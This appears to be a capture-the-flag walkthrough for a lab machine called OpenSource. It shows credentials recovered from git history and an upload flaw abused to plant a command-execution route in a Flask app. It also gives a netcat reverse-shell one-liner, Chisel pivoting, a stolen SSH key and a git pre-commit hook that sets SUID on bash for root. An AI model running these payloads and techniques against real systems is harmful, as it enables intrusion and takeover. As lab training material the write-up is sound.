# OpenSource

OpenSource is a CTF that focusses on being able to traverse git repositories, LFI, understanding port forwarding and reverse proxies and understanding the intricacies of coding.

## Enumeration

```vim
nmap -Pn -v <IP_ADDR>
```

![Image](images/1.png)

Nmap scan shows that there is an ssh port open, a web server available and port 3000 with some service running.

```vim
gobuster dir -u 10.10.11.164 -w /usr/share/wordlists/dirb/common.txt
```

![Image](images/2.png)

Gobuster scan shows the the existence of `/download` and `/console`

`/console` seems to be an admin panel but we aren't able to access it yet, so it would have to wait.

`/upcloud` is where you can upload files, store them on the target machine and download them. (Not available via gobuster scan but available on the website)

We can also get the source code for the web application by making a GET request to `/download`. This will download a github repository which we can use for seeing how the web application handles requests.

Once you download the repository, you see that it has the `.git` folder which we can use for seeing any commits that could give us any Sensitive Data Exposure.

```bash
┌──(lolboi㉿lolboi)-[~/opensource]
└─$ git branch
  dev
* public
                                                                                                                                                                                                      
┌──(lolboi㉿lolboi)-[~/opensource]
└─$ git log   
commit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -> public)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:55:55 2022 +0200

    clean up dockerfile for production use

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                                                                                                                      
┌──(lolboi㉿lolboi)-[~/opensource]
└─$ git switch dev   
Switched to branch 'dev'
                                                                                                                                                                                                      
┌──(lolboi㉿lolboi)-[~/opensource]
└─$ git log       
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
                                                                                                                                                                                                      
┌──(lolboi㉿lolboi)-[~/opensource]
└─$ git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820
diff --git a/.gitignore b/.gitignore
deleted file mode 100644
index e50a290..0000000
--- a/.gitignore
+++ /dev/null
@@ -1,26 +0,0 @@
-.DS_Store
-.env
-.flaskenv
-*.pyc
-*.pyo
-env/
-venv/
-.venv/
-env*
-dist/
-build/
-*.egg
-*.egg-info/
-_mailinglist
-.tox/
-.cache/
-.pytest_cache/
-.idea/
-docs/_build/
-.vscode
-
-# Coverage reports
-htmlcov/
-.coverage
-.coverage.*
-*,cover
diff --git a/Dockerfile b/Dockerfile
index 0875eda..76c7768 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE=1
 
 # Set mode
 ENV MODE="PRODUCTION"
-ENV FLASK_DEBUG=1
+# ENV FLASK_DEBUG=1
 
 # Run supervisord
 CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
```

We can see that there are 2 branches, dev and public. public doesn't seem to have any updates, but when we switch the branch to dev we can see that there is an update. Looking more into it, We come across these credentials `dev01:Soulless_Developer#2022`.

Looking into the source code, we can see how the file gets downloaded in `views.py`

```python
...

@app.route('/upcloud', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

...
```

### Exploit

os.path.join()[https://docs.python.org/3/library/os.path.html#os.path.join] tells us that if an absolute path is mentioned, then the previous components are thrown away and only the absolute path is used. `views.py` also contains the app routes, this means that we could just add another route for RCE.

```python
@app.route('/exec')
def command():
	cmd = request.args.get('cmd')
	os.system(f"{cmd}")
	return f"{cmd}"
```

Upload the new views.py to `/upcloud` and change the filename to `/app/app/views.py`:

![Image](images/3.png)

This lets us create the `/exec` endpoint that we can use to execute code on the target machine. Run `nc -lvnp` on your Attacking machine.

We will use the `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <PORT> >/tmp/f` reverse shell payload like this:

![Image](images/4.png)

Tip: Make sure to URL encode the payload and then add it after `?cmd=`.

Now that we have a shell to the target machine, we can see that it is actually a docker container. Here, the port 3000 that we saw earlier can come in handy.

If you run `wget http://10.10.11.164:3000` on the target machine, you see that we are able to download a web page but we are not able to access it via our attacking machine.

Run `ifconfig` on the machine to find out what ip range it is running on, this will help with finding what IP the port 3000 service is running.

For this, we have to use a tool called Chisel(https://github.com/jpillora/chisel) in order to relay traffic to us. After transferring the chisel binary onto the target machine and then execute the following:

```vim
Attacking Machine: sudo chisel server --port 3000 -v --reverse --socks5

Client Machine: ./chisel client <IP>:3000 R:5000:socks
```
Add Chisel to your FoxyProxy like this:

![Image](images/5.png)

Now you can change proxies and view the hidden service at `http://172.17.0.1:3000/`. Log in with the credentials `dev01:Soulless_Developer#2022` and We will be able to see a `home-backup` repository with `.ssh` folder which contains the id_rsa. We can use this to log into the target machine as the dev01 user.

```vim
ssh dev01@<IP> -i id_rsa
```

The user flag can be found in your home in `user.txt`

## Priv-Esc

linPEAS doesn't reveal anything special, however, pspy reveals that every minute there is a git-sync script being run by root. The git-sync command includes this:

```vim
#!/bin/bash

cd /home/dev01/

if ! git status --porcelain; then
    echo "No changes"
else
    day=$(date +'%Y-%m-%d')
    echo "Changes detected, pushing.."
    git add .
    git commit -m "Backup for ${day}"
    git push origin main
fi
```

If we look into GTFObins(https://gtfobins.github.io/gtfobins/git/#shell), we see that priv-esc is possible via Github Hooks (making a pre-commit hook which is a script that will run before the `git commit` command).

Run the following command and wait for the git-sync script to be run again:

```vim
echo "chmod +s /bin/bash" > /home/dev01/.git/hooks/pre-commit
```

Once /bin/bash has updated permissions, run `bash -p` and you will have root access.

Root flag is in `/root/root.txt`
